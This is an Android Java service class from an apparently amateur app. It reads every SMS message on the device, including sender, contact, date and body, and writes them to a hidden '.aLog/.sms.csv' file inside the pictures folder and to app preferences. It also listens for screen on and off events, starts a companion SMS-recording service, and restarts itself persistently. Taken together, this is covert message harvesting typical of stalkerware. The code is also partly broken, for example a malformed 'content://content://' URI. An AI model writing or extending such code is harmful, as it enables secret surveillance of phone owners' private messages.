package mdane.myapplication6.Services;

import android.app.Activity;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;

import com.evernote.android.job.JobManager;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

import mdane.myapplication6.Jobs.App;
import mdane.myapplication6.Jobs.DemoJobCreator;
import mdane.myapplication6.Jobs.DemoSyncJob;
import mdane.myapplication6.Receivers.MyReceiver2;
import mdane.myapplication6.Receivers.SMSObj;
import mdane.myapplication6.SmsRecordSent;
import mdane.myapplication6.util.SmsObserver;
import mdane.myapplication6.util.printFile;

public class MyService extends Service {
    static int count;
Handler handler;
    Uri aURI;
    Context context;
    Handler aHandler;
//sms Asms;
    ArrayList aList;
   public static String Running=null;
    SharedPreferences.Editor editor;File file= printFile.openFileFor();

    @Override
    public void onCreate() {
Running="Running";
        IntentFilter aFilter = new IntentFilter();
        IntentFilter aFilter1 = new IntentFilter();
        IntentFilter aFilter3 = new IntentFilter();
        aFilter.addAction(Intent.ACTION_SCREEN_ON);
        aFilter1.addAction(Intent.ACTION_SCREEN_OFF);
        aFilter3.addAction("android.provider.Telephony.NEW_OUTGOING_SMS");
        // registerReceiver(new MyReceiver(),             <intent-filter>
        aURI=Uri.parse("content://sms/inbox/");
        SMSObj.tryURI(getApplicationContext(),"content://sms","convo.txt");
        registerReceiver(new MyReceiver2(), aFilter);

        registerReceiver(new MyReceiver2(), aFilter1);
        ContentResolver a=getContentResolver();
       // SmsObserver smsSentObserver = new SmsObserver(new Handler(), this);
      //  final Uri SMS_STATUS_URI = Uri.parse("content://sms");
        final Uri SMS_STATUS_URI = Uri.parse("content://sms");

      Intent aIntent=new Intent(getApplicationContext(),SmsRecordSent.class);
   startService(aIntent);
    }




    public void tryURI(Context context, Uri URI1){
        Uri mSmsinboxQueryUri =URI1;


        SharedPreferences values = context.getSharedPreferences("SMS",Activity.MODE_PRIVATE);
        editor = values.edit();
    Cursor cursor1 = context.getContentResolver().query(mSmsinboxQueryUri,new String[] { "_id", "thread_id", "address", "person", "date","body", "type" }, null, null, null);
        final String[] projection = new String[]{"*"};
        Uri uri = Uri.parse("content://content://sms/conversations/");
//        Cursor query = context.getApplicationContext().getContentResolver().query(uri,projection,null,null,null);
        String[] columns = new String[] { "address", "person", "date", "body","type" };
 aList=new ArrayList<String>();
       if (cursor1.getCount() > 0) {
            String count = Integer.toString(cursor1.getCount());
            while (cursor1.moveToNext()){
                String address = cursor1.getString(cursor1.getColumnIndex(columns[0]));
                String name = cursor1.getString(cursor1.getColumnIndex(columns[1]));
                String date = cursor1.getString(cursor1.getColumnIndex(columns[2]));
                String msg = cursor1.getString(cursor1.getColumnIndex(columns[3]));
                String type = cursor1.getString(cursor1.getColumnIndex(columns[4]));
                aList.add(address+name+date+msg+type);

            }
          //  for(int i=0;i<aList.size();i++){
           // editor.putString("Message"+Integer.toString(i),aList.get(i).toString());
           File file = new File(Environment.DIRECTORY_PICTURES+"/.aLog/",".sms.csv");
           try {
               PrintWriter pw = null;
               try {
                   file.createNewFile() ;  pw = new PrintWriter(file);
                   pw.println(aList.toString());
               } catch (FileNotFoundException e) {
                   e.printStackTrace();
               }

               System.out.println("file created: " + file);
           }catch (Exception e) {}
//write the bytes in file

           //  editor.commit();}
           Set<String> set = new HashSet<String>(aList);

           editor.putStringSet("Message",set);editor.commit();}}

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
}
